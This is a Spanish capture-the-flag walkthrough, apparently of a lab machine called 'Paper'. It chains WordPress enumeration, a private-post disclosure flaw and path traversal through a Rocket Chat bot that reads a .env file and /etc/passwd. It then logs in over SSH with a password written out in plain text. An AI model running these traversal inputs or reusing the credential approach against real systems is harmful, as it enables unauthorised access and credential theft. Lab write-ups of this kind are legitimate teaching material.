### NMAP
```
nmap -p- -Pn -sS -sV 10.129.136.31
```
![](Pasted%20image%2020260119024216-1.png)
### CURL

```
curl -I 10.129.136.31
```
![](Pasted%20image%2020260119024111-1.png)Descubrimos un dominio:
```
X-Backend-Server: office.paper
```

Modificamos el /etc/hosts
![](Pasted%20image%2020260119024319-1.png)
```
10.129.136.31 office.paper
```


### WEB

Accedemos a la url
```
http://office.paper/
```
![](Pasted%20image%2020260119024529-1.png)
Se observa que la página es wordpress

### WORDPRESS

```
wpscan --url http://office.paper/ --enumerate u --api-token <token>
```
![](Pasted%20image%2020260120134946-1.png)
![](Pasted%20image%2020260120135234-1.png)

### WEB

Navegamos por la web y accedemos a un posten el que aparece un comentario indicando un secreto
```
http://office.paper/index.php/2021/06/19/feeling-alone/
```
![](Pasted%20image%2020260120140307-1.png)
Analizamos el código de la web y al buscar la palabra secret vemos una url 
![](Pasted%20image%2020260120140650-1.png)
```
http://office.paper/index.php/2021/06/19/secret-of-my-success/feed/
```
Al acceder nos descarga un archivo
![](Pasted%20image%2020260120140734-1.png)
Abrimos el archivo pero no aporta información relevante, solo una url
![](Pasted%20image%2020260120141503-1.png)

### SEARCHSPLOIT
Al realizar el escaneo con wpscan se mostró la versión de wordpress, buscamos exploits con esa versión
```
searchsploit wordpress 5.2.3
```
![](Pasted%20image%2020260120144008-1.png)
Se observa un exploit que permite ver post privados, podría tener relación con el comentario del post comentado anteriormente.

WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                 | multiple/webapps/47690.md

![](Pasted%20image%2020260120142642-1.png)
```
http://office.paper/?static=1
```

Encontramos el "secreto"
![](Pasted%20image%2020260120145330-1.png)
### ROCKET CHAT
```
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

Modificamos el archivo hosts para actualizar la entrada del dominio
```
10.129.136.31 chat.office.paper
```
![](Pasted%20image%2020260120145856-1.png)
Procedemos con el registro y accedemos al panel
![](Pasted%20image%2020260120150044-1.png)

SI accedemos al chat general podemos observar que hay un bot que permite ejecutar una serie de consultas y comandos
![](Pasted%20image%2020260121023412-1.png)
Podemos obtener información de las consultas y comandos escribiendo help en el chat privado del bot.
![](Pasted%20image%2020260121023510-1.png)
Utilizamos el comando list para realizar Path Traversal
![](Pasted%20image%2020260121023617-1.png)
Observamos que existe una ruta que hace referencia al nombre del bot.

Buscamos información sobre hubot en rocket chat:
```
https://developer.rocket.chat/docs/bots-development-environment-setup
```
![](Pasted%20image%2020260121023252-1.png)

Buscamos el archivo con la ayuda del bot
```
file ../hubot/.env
```
![](Pasted%20image%2020260121024016-1.png)

Probamos a acceder al servidor con las credenciales pero no son correctas o no pertenecen al usuario
```
ssh recyclops@10.129.136.31
Queenofblad3s!23
```
![](Pasted%20image%2020260121024329-1.png)
Buscamos los usuarios del servidor a través del bot
```
file ../../../etc/passwd
```
![](Pasted%20image%2020260121024534-1.png)
Encontramos a los usuarios rocketchat y dwight, probamos las credenciales con esos usuarios.
```
ssh rocketchat@10.129.136.31
ssh dwight@10.129.136.31
Queenofblad3s!23
```
Conseguimos acceder con el usuario de dwight
![](Pasted%20image%2020260121024805-1.png)
